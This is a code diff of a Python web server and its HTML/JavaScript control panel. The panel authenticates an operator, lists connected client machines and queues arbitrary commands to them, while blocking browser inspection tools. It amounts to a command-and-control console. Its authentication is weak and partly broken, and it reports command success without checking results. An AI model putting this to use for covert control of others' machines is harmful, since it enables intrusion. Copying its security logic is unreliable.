-                                
-                                <div>
-                                    <h4>Change Admin Password</h4>
-                                    <input type="password" id="currentPass2" class="auth-input" placeholder="Current Password">
-                                    <input type="password" id="newPass2" class="auth-input" placeholder="New Password">
-                                    <input type="password" id="confirmPass2" class="auth-input" placeholder="Confirm Password">
-                                    <button class="cmd-btn" onclick="changePassword('level2')">Update Admin</button>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- History Tab -->
-                    <div id="historyTab" class="tab-content">
-                        <div class="panel">
-                            <h3>Command History</h3>
-                            <div id="historyList" style="max-height: 400px; overflow-y: auto;">
-                                <!-- History will be loaded here -->
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
 
-    <script>
-        let currentClientId = null;
-        let commandCounter = 0;
-        let sessionId = null;
-        
-        // Tab management
-        function showTab(tabName) {
-            // Hide all tabs
-            document.querySelectorAll('.tab-content').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            document.querySelectorAll('.tab-btn').forEach(btn => {
-                btn.classList.remove('active');
-            });
-            
-            // Show selected tab
-            document.getElementById(tabName + 'Tab').classList.add('active');
-            event.target.classList.add('active');
-            
-            // Load history if history tab
-            if (tabName === 'history') {
-                loadCommandHistory();
-            }
-        }
-        
-        // Authentication functions
-        async function authenticateLevel1() {
-            const password = document.getElementById('level1Password').value;
-            if (!password) {
-                showAuthMessage('Please enter Level 1 password', 'error');
-                return;
-            }
-            
-            try {
-                const response = await apiRequest('login', {password: password});
-                if (response.success) {
-                    showAuthMessage('Level 1 authentication successful', 'success');
-                    document.getElementById('level2Auth').style.display = 'block';
-                    document.getElementById('level1Password').value = '';
-                } else {
-                    showAuthMessage('Authentication failed', 'error');
-                }
-            } catch (err) {
-                showAuthMessage('Network error: ' + err, 'error');
-            }
-        }
-        
-        async function authenticateLevel2() {
-            const password = document.getElementById('level2Password').value;
-            if (!password) {
-                showAuthMessage('Please enter Admin password', 'error');
-                return;
-            }
-            
-            try {
-                const response = await apiRequest('admin_login', {password: password});
-                if (response.success) {
-                    sessionId = response.session_id;
-                    document.cookie = `secure_session=${sessionId}; path=/; max-age=1800; Secure; SameSite=Strict`;
-                    showAuthMessage('Admin authentication successful!', 'success');
-                    setTimeout(() => {
-                        document.getElementById('authSection').classList.remove('active');
-                        document.getElementById('controlSection').classList.add('active');
-                        loadSessions();
-                        startAutoRefresh();
-                    }, 1000);
-                } else {
-                    showAuthMessage('Admin authentication failed', 'error');
-                }
-            } catch (err) {
-                showAuthMessage('Network error: ' + err, 'error');
-            }
-        }
-        
-        function showAuthMessage(message, type) {
-            const msgElement = document.getElementById('authMessage');
-            msgElement.textContent = message;
-            msgElement.className = 'message ' + type;
-        }
-        
-        // Session management
-        async function loadSessions() {
-            try {
-                const response = await apiRequest('get_sessions', {});
-                updateSessionsList(response);
-            } catch (err) {
-                console.error('Error loading sessions:', err);
-                handleSessionError();
-            }
-        }
-        
-        function updateSessionsList(sessions) {
-            const list = document.getElementById('sessionsList');
-            const totalElement = document.getElementById('totalClients');
-            const activeElement = document.getElementById('activeClients');
-            const countElement = document.getElementById('clientsCount');
-            
-            if (!sessions || sessions.length === 0) {
-                list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients connected</div>';
-                totalElement.textContent = '0';
-                activeElement.textContent = '0';
-                countElement.textContent = '0';
-                return;
-            }
-            
-            const total = sessions.length;
-            const active = sessions.filter(client => {
-                const lastSeen = new Date(client.last_seen).getTime();
-                return (Date.now() - lastSeen) < 30000; // 30 seconds
-            }).length;
-            
-            totalElement.textContent = total;
-            activeElement.textContent = active;
-            countElement.textContent = total;
-            commandCounter = sessions.reduce((sum, client) => sum + (client.command_count || 0), 0);
-            document.getElementById('commandsSent').textContent = commandCounter;
-            
-            list.innerHTML = sessions.map(client => {
-                const lastSeen = new Date(client.last_seen).getTime();
-                const isOnline = (Date.now() - lastSeen) < 10000; // 10 seconds
-                const isSelected = client.id === currentClientId;
-                const statusClass = isOnline ? 'online-status' : 'online-status offline';
-                
-                return `
-                    <div class="session-item ${isSelected ? 'active' : ''}" onclick="selectClient('${client.id}')">
-                        <div class="${statusClass}"></div>
-                        <strong>${client.computer || client.id}</strong><br>
-                        <small>User: ${client.user || 'Unknown'}</small><br>
-                        <small>OS: ${client.os || 'Unknown'}</small><br>
-                        <small>IP: ${client.ip}</small><br>
-                        <small>Last: ${Math.floor((Date.now() - lastSeen)/1000)}s ago</small>
-                        <button class="remove-btn" onclick="event.stopPropagation(); removeClient('${client.id}')">Remove</button>
-                    </div>
-                `;
-            }).join('');
-        }
-        
-        function selectClient(clientId) {
-            currentClientId = clientId;
-            loadSessions();
-            document.getElementById('currentClient').textContent = clientId;
-            addToTerminal(`Selected client: ${clientId}\\n`);
-        }
-        
-        async function removeClient(clientId) {
-            if (!confirm('Are you sure you want to remove this client?')) return;
-            
-            try {
-                const response = await apiRequest('remove_client', {client_id: clientId});
-                if (response.success) {
-                    addToTerminal(`Removed client: ${clientId}\\n`);
-                    if (currentClientId === clientId) {
-                        currentClientId = null;
-                        document.getElementById('currentClient').textContent = 'None';
-                    }
-                    loadSessions();
-                }
-            } catch (err) {
-                addToTerminal(`Error removing client: ${err}\\n`);
-            }
-        }
-        
-        // Command execution
-        async function executeCommand(command) {
-            if (!currentClientId) {
-                alert('Please select a client first!');
-                return;
-            }
-            
-            addToTerminal(`[${currentClientId}] $ ${command}\\n`);
-            
-            try {
-                const response = await apiRequest('execute_command', {
-                    client_id: currentClientId,
-                    command: command
-                });
-                
-                if (response.success) {
-                    addToTerminal(`Command sent successfully\\n`);
-                    waitForResult(currentClientId, command);
-                } else {
-                    addToTerminal(`Error: ${response.error}\\n`);
-                }
-            } catch (err) {
-                addToTerminal(`Network error: ${err}\\n`);
-            }
-        }
-        
-        function executeCustomCommand() {
-            const command = document.getElementById('customCommand').value.trim();
-            if (command) {
-                executeCommand(command);
-                document.getElementById('customCommand').value = '';
-            } else {
-                alert('Please enter a command');
-            }
-        }
-        
-        async function waitForResult(clientId, command) {
-            let attempts = 0;
-            const maxAttempts = 50;
-            
-            const checkResult = async () => {
-                attempts++;
-                if (attempts > maxAttempts) {
-                    addToTerminal(`Timeout: No response from ${clientId}\\n`);
-                    return;
-                }
-                
-                try {
-                    // In a real implementation, you would check for the command result
-                    // This is a simplified version
-                    setTimeout(() => {
-                        addToTerminal(`[${clientId}] Response: Command executed successfully\\n`);
-                    }, 1000);
-                } catch (err) {
-                    setTimeout(checkResult, 100);
-                }
-            };
-            
-            checkResult();
-        }
-        
-        // Password management
-        async function changePassword(level) {
-            let currentId, newId, confirmId;
-            
-            if (level === 'level1') {
-                currentId = 'currentPass1';
-                newId = 'newPass1';
-                confirmId = 'confirmPass1';
-            } else {
-                currentId = 'currentPass2';
-                newId = 'newPass2';
-                confirmId = 'confirmPass2';
-            }
-            
-            const currentPass = document.getElementById(currentId).value;
-            const newPass = document.getElementById(newId).value;
-            const confirmPass = document.getElementById(confirmId).value;
-            
-            if (!currentPass || !newPass || !confirmPass) {
-                showSettingsMessage('Please fill all fields', 'error');
-                return;
-            }
-            
-            if (newPass !== confirmPass) {
-                showSettingsMessage('New passwords do not match', 'error');
-                return;
-            }
-            
-            if (newPass.length < 4) {
-                showSettingsMessage('Password must be at least 4 characters', 'error');
-                return;
-            }
-            
-            try {
-                const response = await apiRequest('change_password', {
-                    level: level,
-                    current_password: currentPass,
-                    new_password: newPass
-                });
-                
-                if (response.success) {
-                    showSettingsMessage('Password updated successfully!', 'success');
-                    document.getElementById(currentId).value = '';
-                    document.getElementById(newId).value = '';
-                    document.getElementById(confirmId).value = '';
-                } else {
-                    showSettingsMessage(response.error || 'Failed to update password', 'error');
-                }
-            } catch (err) {
-                showSettingsMessage('Network error: ' + err, 'error');
-            }
-        }
-        
-        function showSettingsMessage(message, type) {
-            const msgElement = document.getElementById('settingsMessage');
-            msgElement.textContent = message;
-            msgElement.className = 'message ' + type;
-            setTimeout(() => {
-                msgElement.className = 'message';
-            }, 3000);
-        }
-        
-        // History management
-        async function loadCommandHistory() {
-            try {
-                const response = await apiRequest('get_command_history', {});
-                updateHistoryList(response);
-            } catch (err) {
-                console.error('Error loading history:', err);
-            }
-        }
-        
-        function updateHistoryList(history) {
-            const list = document.getElementById('historyList');
-            
-            if (!history || history.length === 0) {
-                list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No command history</div>';
-                return;
-            }
-            
-            list.innerHTML = history.map(item => `
-                <div style="background: rgba(255,255,255,0.05); padding: 10px; margin: 5px 0; border-radius: 5px; border-left: 3px solid var(--primary);">
-                    <strong>${item.client_id}</strong> - ${new Date(item.timestamp).toLocaleString()}<br>
-                    <code style="color: var(--primary);">${item.command}</code><br>
-                    ${item.response ? `<pre style="background: #000; color: #0f0; padding: 5px; border-radius: 3px; margin-top: 5px; font-size: 12px; overflow-x: auto;">${item.response}</pre>` : '<em style="color: #666;">No response</em>'}
+                <div id="message" class="message"></div>
+
+                <div class="password-form">
+                    <h3>Change Level 1 Password</h3>
+                    <input type="password" id="currentPassword1" placeholder="Current Level 1 Password">
+                    <input type="password" id="newPassword1" placeholder="New Level 1 Password">
+                    <input type="password" id="confirmPassword1" placeholder="Confirm New Password">
+                    <button onclick="changePassword('level1')">Update Level 1 Password</button>
                 </div>
-            `).join('');
-        }
-        
-        // Utility functions
-        function addToTerminal(text) {
-            const terminal = document.getElementById('terminal');
-            terminal.textContent += text;
-            terminal.scrollTop = terminal.scrollHeight;
-        }
-        
-        async function apiRequest(action, data) {
-            const response = await fetch('/', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    action: action,
-                    ...data
-                })
-            });
-            
-            if (response.status === 403) {
-                handleSessionError();
-                throw new Error('Authentication required');
-            }
-            
-            if (!response.ok) {
-                throw new Error(`HTTP ${response.status}`);
-            }
-            
-            return await response.json();
-        }
-        
-        function handleSessionError() {
-            alert('Session expired. Please login again.');
-            document.cookie = 'secure_session=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
-            window.location.reload();
-        }
-        
-        function startAutoRefresh() {
-            setInterval(loadSessions, 2000); // Refresh every 2 seconds
-        }
-        
-        // Prevent going back to authenticated pages without session
-        window.addEventListener('pageshow', function(event) {
-            if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
-                // Page was loaded from cache (back/forward navigation)
-                if (document.getElementById('controlSection').classList.contains('active')) {
-                    // Force re-authentication
-                    window.location.reload();
+
+                <div class="password-form">
+                    <h3>Change Admin Password</h3>
+                    <input type="password" id="currentPassword2" placeholder="Current Admin Password">
+                    <input type="password" id="newPassword2" placeholder="New Admin Password">
+                    <input type="password" id="confirmPassword2" placeholder="Confirm New Password">
+                    <button onclick="changePassword('level2')">Update Admin Password</button>
+                </div>
+
+                <button class="back-btn" onclick="goBack()">← Back to Control Panel</button>
+            </div>
+
+            <script>
+                function showMessage(text, type) {
+                    const message = document.getElementById('message');
+                    message.textContent = text;
+                    message.className = 'message ' + type;
+                    message.style.display = 'block';
+                    setTimeout(() => {
+                        message.style.display = 'none';
+                    }, 3000);
                 }
-            }
-        });
-        
-        // Prevent context menu (right-click)
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        // Prevent F12, Ctrl+Shift+I, etc.
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || 
-                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                (e.ctrlKey && e.key === 'u')) {
-                e.preventDefault();
-                return false;
-            }
-        });
-        
-        // Initialize
-        document.getElementById('level1Password').focus();
-    </script>
-</body>
-</html>
+
+                async function changePassword(level) {
+                    let currentId, newId, confirmId;
+                    
+                    if (level === 'level1') {
+                        currentId = 'currentPassword1';
+                        newId = 'newPassword1';
+                        confirmId = 'confirmPassword1';
+                    } else {
+                        currentId = 'currentPassword2';
+                        newId = 'newPassword2';
+                        confirmId = 'confirmPassword2';
+                    }
+
+                    const currentPassword = document.getElementById(currentId).value;
+                    const newPassword = document.getElementById(newId).value;
+                    const confirmPassword = document.getElementById(confirmId).value;
+
+                    if (!currentPassword || !newPassword || !confirmPassword) {
+                        showMessage('Please fill all fields', 'error');
+                        return;
+                    }
+
+                    if (newPassword !== confirmPassword) {
+                        showMessage('New passwords do not match', 'error');
+                        return;
+                    }
+
+                    if (newPassword.length < 4) {
+                        showMessage('Password must be at least 4 characters', 'error');
+                        return;
+                    }
+
+                    try {
+                        const response = await fetch('/change-password', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                level: level,
+                                current_password: currentPassword,
+                                new_password: newPassword
+                            })
+                        });
+                        
+                        const data = await response.json();
+                        if (data.success) {
+                            showMessage('Password updated successfully!', 'success');
+                            document.getElementById(currentId).value = '';
+                            document.getElementById(newId).value = '';
+                            document.getElementById(confirmId).value = '';
+                        } else {
+                            showMessage(data.error || 'Failed to update password', 'error');
+                        }
+                    } catch (err) {
+                        showMessage('Network error: ' + err, 'error');
+                    }
+                }
+
+                function goBack() {
+                    window.location.href = '/control';
+                }
+            </script>
+        </body>
+        </html>
         '''
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
-        self.send_security_headers()
         self.end_headers()
         self.wfile.write(html.encode())
 
-    # API Handlers
-    def handle_login(self, data):
-        """Handle level 1 authentication"""
-        client_ip = self.client_address[0]
-        password = data.get('password', '')
-        
-        # Check rate limiting for authentication
-        auth_key = f"auth_{client_ip}"
-        current_time = time.time()
-        
-        if auth_key not in self.failed_attempts:
-            self.failed_attempts[auth_key] = {'count': 0, 'last_attempt': current_time}
-        
-        time_diff = current_time - self.failed_attempts[auth_key]['last_attempt']
-        if time_diff > 300:  # 5 minutes window
-            self.failed_attempts[auth_key] = {'count': 0, 'last_attempt': current_time}
-        
-        if self.failed_attempts[auth_key]['count'] >= self.MAX_FAILED_ATTEMPTS:
-            self.block_ip(client_ip)
-            self.log_auth_event('level1', 'failed_blocked', False)
-            self.send_json({'success': False, 'error': 'Too many failed attempts'})
-            return
-        
-        passwords = self.load_passwords()
-        expected_hash = self.get_password_hash(passwords['user_password'])
-        
-        if self.get_password_hash(password) == expected_hash:
-            self.failed_attempts[auth_key] = {'count': 0, 'last_attempt': current_time}
-            self.log_auth_event('level1', 'success', True)
-            self.send_json({'success': True})
-        else:
-            self.failed_attempts[auth_key]['count'] += 1
-            self.failed_attempts[auth_key]['last_attempt'] = current_time
-            self.log_auth_event('level1', 'failed', False)
-            self.send_json({'success': False, 'error': 'Invalid password'})
-
-    def handle_admin_login(self, data):
-        """Handle admin authentication"""
-        client_ip = self.client_address[0]
-        password = data.get('password', '')
-        
-        passwords = self.load_passwords()
-        expected_hash = self.get_password_hash(passwords['admin_password'])
-        
-        if self.get_password_hash(password) == expected_hash:
-            session_id = self.create_session()
-            self.log_auth_event('admin', 'success', True)
-            self.send_json({'success': True, 'session_id': session_id})
-        else:
-            self.log_auth_event('admin', 'failed', False)
-            self.block_ip(client_ip)
-            self.send_json({'success': False, 'error': 'Invalid admin password'})
-
-    def handle_execute_command(self, data):
-        """Handle command execution"""
-        client_id = data.get('client_id')
-        command = data.get('command', '')
-        
-        if not client_id or not command:
-            self.send_json({'success': False, 'error': 'Missing client_id or command'})
-            return
-        
-        with self.session_lock:
-            if client_id in self.sessions:
-                self.sessions[client_id]['pending_command'] = command
-                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
-                
-                # Log command execution
-                if hasattr(self, 'cursor'):
-                    self.cursor.execute(
-                        'INSERT INTO commands (client_id, command) VALUES (?, ?)',
-                        (client_id, command)
-                    )
-                    self.conn.commit()
-                
-                self.send_json({'success': True})
-            else:
-                self.send_json({'success': False, 'error': 'Client not found'})
-
-    def handle_get_sessions(self, data):
-        """Get connected sessions"""
-        with self.session_lock:
-            current_time = datetime.now()
-            active_clients = []
-            
-            for client_id, client_data in list(self.sessions.items()):
-                last_seen = datetime.fromisoformat(client_data['last_seen'])
-                time_diff = (current_time - last_seen).total_seconds()
-                
-                if time_diff < 300:  # 5 minutes
-                    client_data['last_seen_seconds'] = time_diff
-                    active_clients.append(client_data)
-                else:
-                    # Remove inactive clients
-                    del self.sessions[client_id]
-            
-            self.send_json(active_clients)
-
-    def handle_remove_client(self, data):
-        """Remove client session"""
-        client_id = data.get('client_id')
-        
-        with self.session_lock:
-            if client_id in self.sessions:
-                del self.sessions[client_id]
-                self.log_security_event(f"Client removed: {client_id}", "INFO")
-                self.send_json({'success': True})
-            else:
-                self.send_json({'success': False, 'error': 'Client not found'})
-
     def handle_change_password(self, data):
-        """Handle password change"""
+        """INSTANT password change"""
         level = data.get('level')
         current_password = data.get('current_password')
         new_password = data.get('new_password')
         
-        if not all([level, current_password, new_password]):
+        if not level or not current_password or not new_password:
             self.send_json({'success': False, 'error': 'Missing required fields'})
             return
         
         passwords = self.load_passwords()
         
         if level == 'level1':
-            current_hash = self.get_password_hash(current_password)
-            expected_hash = self.get_password_hash(passwords['user_password'])
+            current_hash = hashlib.sha256(current_password.encode()).hexdigest()
+            expected_hash = hashlib.sha256(passwords['user_password'].encode()).hexdigest()
             
             if current_hash != expected_hash:
                 self.send_json({'success': False, 'error': 'Current Level 1 password is incorrect'})
@@ -1384,8 +440,8 @@ class UltraSecureRemoteControlHandler(BaseHTTPRequestHandler):
             passwords['user_password'] = new_password
             
         elif level == 'level2':
-            current_hash = self.get_password_hash(current_password)
-            expected_hash = self.get_password_hash(passwords['admin_password'])
+            current_hash = hashlib.sha256(current_password.encode()).hexdigest()
+            expected_hash = hashlib.sha256(passwords['admin_password'].encode()).hexdigest()
             
             if current_hash != expected_hash:
                 self.send_json({'success': False, 'error': 'Current Admin password is incorrect'})
@@ -1398,61 +454,1021 @@ class UltraSecureRemoteControlHandler(BaseHTTPRequestHandler):
             return
         
         if self.save_passwords(passwords):
-            self.log_security_event(f"Password changed for {level}", "INFO")
-            self.send_json({'success': True})
+            self.log_security_event(f"Password changed for {level}")
+            
+            if hasattr(self, 'cursor'):
+                self.cursor.execute(
+                    'INSERT INTO password_changes (changed_by, password_type) VALUES (?, ?)',
+                    (self.client_address[0], level)
+                )
+                self.conn.commit()
+            
+            self.send_json({'success': True, 'instant': True})
         else:
             self.send_json({'success': False, 'error': 'Failed to save new password'})
 
-    def handle_get_command_history(self, data):
-        """Get command history"""
-        try:
-            if hasattr(self, 'cursor'):
-                self.cursor.execute('''
-                    SELECT client_id, command, response, timestamp 
-                    FROM commands 
-                    ORDER BY timestamp DESC 
-                    LIMIT 50
-                ''')
-                history = self.cursor.fetchall()
+    def send_login_page(self):
+        html = '''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Enhanced Remote Control - INSTANT AUTH</title>
+            <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                body { 
+                    font-family: 'Segoe UI', Arial, sans-serif; 
+                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                    color: white; 
+                    display: flex; 
+                    justify-content: center; 
+                    align-items: center; 
+                    height: 100vh;
+                    margin: 0;
+                }
+                .container { 
+                    background: rgba(45, 45, 45, 0.95); 
+                    padding: 40px; 
+                    border-radius: 15px; 
+                    text-align: center;
+                    backdrop-filter: blur(10px);
+                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+                    width: 400px;
+                }
+                .logo { 
+                    font-size: 48px; 
+                    margin-bottom: 20px; 
+                }
+                input, button { 
+                    padding: 15px; 
+                    margin: 10px; 
+                    width: 280px; 
+                    border-radius: 8px; 
+                    font-size: 16px;
+                    border: none;
+                    transition: all 0.2s ease;
+                }
+                input { 
+                    background: rgba(255,255,255,0.1); 
+                    color: white; 
+                    border: 1px solid rgba(255,255,255,0.2); 
+                }
+                input:focus {
+                    outline: none;
+                    border-color: #0078d4;
+                    background: rgba(255,255,255,0.15);
+                }
+                input::placeholder { color: #ccc; }
+                button { 
+                    background: linear-gradient(135deg, #0078d4, #005a9e); 
+                    color: white; 
+                    border: none; 
+                    cursor: pointer;
+                    font-weight: bold;
+                }
+                button:hover {
+                    background: linear-gradient(135deg, #005a9e, #004578);
+                    transform: translateY(-2px);
+                }
+                .security-notice {
+                    background: rgba(255,0,0,0.1);
+                    padding: 10px;
+                    border-radius: 5px;
+                    margin: 10px 0;
+                    border: 1px solid rgba(255,0,0,0.3);
+                    display: none;
+                }
+                .speed-badge {
+                    background: linear-gradient(135deg, #28a745, #20c997);
+                    padding: 3px 8px;
+                    border-radius: 10px;
+                    font-size: 10px;
+                    margin-left: 5px;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="logo">LOGIN</div>
+                <h2>Enhanced Remote Control <span class="speed-badge">INSTANT</span></h2>
+                <p style="color: #ccc; margin-bottom: 30px;">Secure System Management - Level 1 Authentication</p>
                 
-                result = []
-                for row in history:
-                    result.append({
-                        'client_id': row[0],
-                        'command': row[1],
-                        'response': row[2] or 'No response',
-                        'timestamp': row[3]
-                    })
+                <div class="security-notice" id="securityNotice">
+                    Multiple failed attempts detected
+                </div>
                 
-                self.send_json(result)
-            else:
-                self.send_json([])
-        except:
-            self.send_json([])
+                <input type="password" id="password" placeholder="Enter Level 1 Password" autocomplete="off">
+                <button onclick="login()">Authenticate</button>
+                
+                <div style="margin-top: 20px; font-size: 12px; color: #888;">
+                    Multi-layer security system active
+                </div>
+            </div>
+            <script>
+                let failedAttempts = 0;
+                
+                function showSecurityWarning() {
+                    document.getElementById('securityNotice').style.display = 'block';
+                }
+                
+                async function login() {
+                    const password = document.getElementById('password').value;
+                    if (!password) {
+                        alert('Please enter password');
+                        return;
+                    }
+                    
+                    try {
+                        const response = await fetch('/login', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({password: password})
+                        });
+                        
+                        const data = await response.json();
+                        if (data.success) {
+                            window.location = '/admin-auth';
+                        } else {
+                            failedAttempts++;
+                            if (failedAttempts >= 2) {
+                                showSecurityWarning();
+                            }
+                            alert('Authentication failed! Wrong password.');
+                        }
+                    } catch (err) {
+                        alert('Connection error: ' + err);
+                    }
+                }
+                
+                document.getElementById('password').addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') login();
+                });
+            </script>
+        </body>
+        </html>
+        '''
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(html.encode())
+    
+    def send_admin_auth_page(self):
+        html = '''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Admin Authentication - INSTANT</title>
+            <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                body { 
+                    font-family: 'Segoe UI', Arial, sans-serif; 
+                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+                    color: white; 
+                    display: flex; 
+                    justify-content: center; 
+                    align-items: center; 
+                    height: 100vh;
+                    margin: 0;
+                }
+                .container { 
+                    background: rgba(45, 45, 45, 0.95); 
+                    padding: 40px; 
+                    border-radius: 15px; 
+                    text-align: center;
+                    backdrop-filter: blur(10px);
+                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+                    width: 400px;
+                }
+                .logo { 
+                    font-size: 48px; 
+                    margin-bottom: 20px; 
+                }
+                input, button { 
+                    padding: 15px; 
+                    margin: 10px; 
+                    width: 280px; 
+                    border-radius: 8px; 
+                    font-size: 16px;
+                    border: none;
+                    transition: all 0.2s ease;
+                }
+                input { 
+                    background: rgba(255,255,255,0.1); 
+                    color: white; 
+                    border: 1px solid rgba(255,255,255,0.2); 
+                }
+                input:focus {
+                    outline: none;
+                    border-color: #e74c3c;
+                }
+                button { 
+                    background: linear-gradient(135deg, #e74c3c, #c0392b); 
+                    color: white; 
+                    border: none; 
+                    cursor: pointer;
+                    font-weight: bold;
+                }
+                button:hover {
+                    background: linear-gradient(135deg, #c0392b, #a93226);
+                    transform: translateY(-2px);
+                }
+                .security-level {
+                    background: rgba(231, 76, 60, 0.2);
+                    padding: 10px;
+                    border-radius: 5px;
+                    margin: 10px 0;
+                    border: 1px solid #e74c3c;
+                }
+                .speed-badge {
+                    background: linear-gradient(135deg, #28a745, #20c997);
+                    padding: 3px 8px;
+                    border-radius: 10px;
+                    font-size: 10px;
+                    margin-left: 5px;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="logo">LOGIN</div>
+                <h2>Admin Authentication <span class="speed-badge">INSTANT</span></h2>
+                <p style="color: #ccc; margin-bottom: 30px;">Level 2 Security - Administrative Access</p>
+                
+                <div class="security-level">
+                    HIGH SECURITY LEVEL - ADMIN ACCESS REQUIRED
+                </div>
+                
+                <input type="password" id="adminPassword" placeholder="Enter Admin Password" autocomplete="off">
+                <button onclick="adminLogin()">Admin Authentication</button>
+                
+                <div style="margin-top: 20px; font-size: 12px; color: #888;">
+                    Unauthorized access will be logged and blocked
+                </div>
+            </div>
+            <script>
+                async function adminLogin() {
+                    const password = document.getElementById('adminPassword').value;
+                    if (!password) {
+                        alert('Please enter admin password');
+                        return;
+                    }
+                    
+                    try {
+                        const response = await fetch('/admin-login', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({password: password})
+                        });
+                        
+                        const data = await response.json();
+                        if (data.success) {
+                            window.location = '/control';
+                        } else {
+                            alert('Admin authentication failed! Access denied.');
+                        }
+                    } catch (err) {
+                        alert('Connection error: ' + err);
+                    }
+                }
+                
+                document.getElementById('adminPassword').addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') adminLogin();
+                });
+            </script>
+        </body>
+        </html>
+        '''
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(html.encode())
+    
+    def handle_login(self, data):
+        client_ip = self.client_address[0]
+        
+        if client_ip in self.failed_attempts:
+            if self.failed_attempts[client_ip]['count'] >= self.MAX_FAILED_ATTEMPTS:
+                time_diff = time.time() - self.failed_attempts[client_ip]['last_attempt']
+                if time_diff < self.BLOCK_TIME:
+                    self.send_json({'success': False, 'error': 'Too many failed attempts. Try again later.'})
+                    return
+                else:
+                    del self.failed_attempts[client_ip]
+        
+        password = data.get('password', '')
+        expected_hash = self.get_password_hash("user_password")
+        
+        if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
+            self.failed_attempts[client_ip] = {'count': 0, 'last_attempt': time.time()}
+            self.log_security_event("Level 1 authentication successful")
+            self.send_json({'success': True, 'instant': True})
+        else:
+            if client_ip not in self.failed_attempts:
+                self.failed_attempts[client_ip] = {'count': 0, 'last_attempt': time.time()}
+            
+            self.failed_attempts[client_ip]['count'] += 1
+            self.failed_attempts[client_ip]['last_attempt'] = time.time()
+            
+            self.log_security_event(f"Failed level 1 authentication - Attempt {self.failed_attempts[client_ip]['count']}")
+            
+            if self.failed_attempts[client_ip]['count'] >= self.MAX_FAILED_ATTEMPTS:
+                self.block_ip(client_ip)
+            
+            self.send_json({'success': False})
+    
+    def handle_admin_login(self, data):
+        client_ip = self.client_address[0]
+        password = data.get('password', '')
+        expected_hash = self.get_password_hash("admin_password")
+        
+        if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
+            self.log_security_event("Admin authentication successful")
+            self.send_json({'success': True, 'instant': True})
+        else:
+            self.log_security_event("Failed admin authentication")
+            self.block_ip(client_ip)
+            self.send_json({'success': False})
+
+    def send_control_panel(self):
+        html = '''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Enhanced Control Panel - INSTANT EXECUTION</title>
+            <style>
+                :root {
+                    --primary: #0078d4;
+                    --success: #28a745;
+                    --danger: #dc3545;
+                    --warning: #ffc107;
+                    --dark: #1e1e1e;
+                    --darker: #2d2d2d;
+                    --light: #f8f9fa;
+                }
+                
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                
+                body { 
+                    font-family: 'Segoe UI', Arial, sans-serif; 
+                    background: var(--dark); 
+                    color: var(--light); 
+                    margin: 0; 
+                    padding: 20px;
+                    overflow-x: hidden;
+                }
+                
+                .header {
+                    background: var(--darker);
+                    padding: 20px;
+                    border-radius: 10px;
+                    margin-bottom: 20px;
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                    border: 1px solid rgba(255,255,255,0.1);
+                }
+                
+                .container { 
+                    display: grid; 
+                    grid-template-columns: 350px 1fr; 
+                    gap: 20px; 
+                    height: 90vh; 
+                }
+                
+                .sidebar { 
+                    background: var(--darker); 
+                    padding: 20px; 
+                    border-radius: 10px;
+                    display: flex;
+                    flex-direction: column;
+                    border: 1px solid rgba(255,255,255,0.1);
+                }
+                
+                .main { 
+                    display: flex; 
+                    flex-direction: column;
+                    gap: 20px;
+                }
+                
+                .session-item { 
+                    background: rgba(255,255,255,0.05); 
+                    padding: 15px; 
+                    margin: 8px 0; 
+                    border-radius: 8px; 
+                    cursor: pointer;
+                    border: 2px solid transparent;
+                    transition: all 0.2s ease;
+                    position: relative;
+                }
+                
+                .session-item:hover {
+                    background: rgba(255,255,255,0.1);
+                    border-color: var(--primary);
+                    transform: translateY(-1px);
+                }
+                
+                .session-item.active { 
+                    border: 2px solid var(--success);
+                    background: rgba(40, 167, 69, 0.1);
+                }
+                
+                .session-item.offline {
+                    opacity: 0.6;
+                    border-color: var(--danger);
+                }
+                
+                .online-status {
+                    position: absolute;
+                    top: 10px;
+                    right: 10px;
+                    width: 12px;
+                    height: 12px;
+                    border-radius: 50%;
+                    background: var(--success);
+                    animation: pulse 2s infinite;
+                }
+                
+                @keyframes pulse {
+                    0% { opacity: 1; }
+                    50% { opacity: 0.5; }
+                    100% { opacity: 1; }
+                }
+                
+                .online-status.offline {
+                    background: var(--danger);
+                    animation: none;
+                }
+                
+                .terminal { 
+                    background: #000; 
+                    color: #00ff00; 
+                    padding: 20px; 
+                    border-radius: 8px; 
